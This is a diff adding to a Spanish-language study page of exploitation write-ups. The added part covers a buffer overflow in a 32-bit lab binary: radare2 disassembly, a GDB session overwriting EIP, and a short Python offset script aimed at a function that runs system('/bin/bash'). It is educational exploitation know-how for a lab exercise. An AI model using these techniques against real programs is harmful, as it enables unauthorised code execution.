@@ -41,6 +41,29 @@ En la sección de comandos sólo me limito a poner el output del comando mas des
 <p>Esta página web será un documento vivo ya que estará en actualización diaria debido a mi estudio constante.</p>
 <h2><a id="refs_uno" href="#refs_uno">1. ROP,NX habilitado, buffer y función read(). ASLR no aleatoriza las direcciones</a></h2>
 <h4>[Informe]:</h4>
+<p><em><strong>Recolección de información</strong></em></p>
+Primero debemos obtener la información necesaria para realizar la explotación del binario. Sabiendo que tiene una función <code>read()</code> que va a leer nuestro input que introduzcamos un tamaño de <code>256</code> bytes y también tenemos un buffer <code>ebp-0x88</code> que es donde se almacenará el input. Si desensamblamos la función <code>vulnerable_function()</code> usando radare2 vemos el tamaño que lee siendo uno de sus argumentos. Esto quiere decir que va a leer más que lo que guarda nuestro buffer.
+<pre><code>[0xf7fc0c70]> s sym.vulnerable_function
+[0x080484b8]> pdf
+/ (fcn) sym.vulnerable_function 41
+|   sym.vulnerable_function ();
+|           ; var int local_88h @ ebp-0x88
+|           ; var int local_4h @ esp+0x4
+|           ; var int local_8h @ esp+0x8
+|           ; CALL XREF from 0x08048518 (sym.main)
+|           0x080484b8      55             push ebp
+|           0x080484b9      89e5           mov ebp, esp
+|           0x080484bb      81ec98000000   sub esp, 0x98
+|           0x080484c1      c74424080001.  mov dword [local_8h], 0x100 ; [0x100:4]=-1 ; 256
+|           0x080484c9      8d8578ffffff   lea eax, dword [local_88h]
+|           0x080484cf      89442404       mov dword [local_4h], eax
+|           0x080484d3      c70424000000.  mov dword [esp], 0
+|           0x080484da      e8a1feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
+|           0x080484df      c9             leave
+\           0x080484e0      c3             ret
+</code></pre>
+La función que debemos ganar acceso para obtener nuestra shell es <code>not_called()</code> debido a que dentro de la función llama a <code>system("/bin/bash")</code>, por lo tanto es fácil ya que no necesitamos una shellcode.
+Usaremos GDB para testear el buffer overflow y ver cuando sobreescribe <code>$eip</code>. Si enviamos un número determinado de "junk" al buffer realizamos la sobreescritura!(ver:exploit).
 <h4>[Comandos]:</h4>
 Primero antes de nada comprobamos la seguridad del binario y observamos que <code>NX</code> esta habilitado.
 <pre><code>❯ gdb -q rop
@@ -52,7 +75,25 @@ NX        : ENABLED
 PIE       : disabled
 RELRO     : Partial
 </code></pre>
+Sobreescritura de <code>$eip</code> con <code>0x44444444</code>. Breakpoint en <code>0x080484df</code>
+<pre><code>gdb-peda$ r
+Starting program: /home/naivenom/pwn/rop1_/rop 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBCCDDBBBBBADDDD
+Breakpoint 1, 0x080484df in vulnerable_function ()
+gdb-peda$ c
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+Stopped reason: SIGSEGV
+0x44444444 in ?? ()
+</code></pre>
 <h4>[Exploit Development]:</h4>
+Enviamos al binario cuando lo debugeamos con GDB la salida de este script usando <code>r < salida</code>
+<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">import</span> sys
+
+sys.stdout.write(<span style="color: #0000FF">&quot;A&quot;</span>*<span style="color: #0000FF">140</span>+<span style="color: #0000FF">&quot;DDDD&quot;</span>)
+</pre></div>
+
+
 <h4>[URL Reto]:</h4>
 <h2><a id="refs_dos" href="#refs_dos">2. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros apuntando al inicio del buffer + shellcode mod 0x0b + float value(stack canary)</a></h2>
 <h4>[Informe]:</h4>
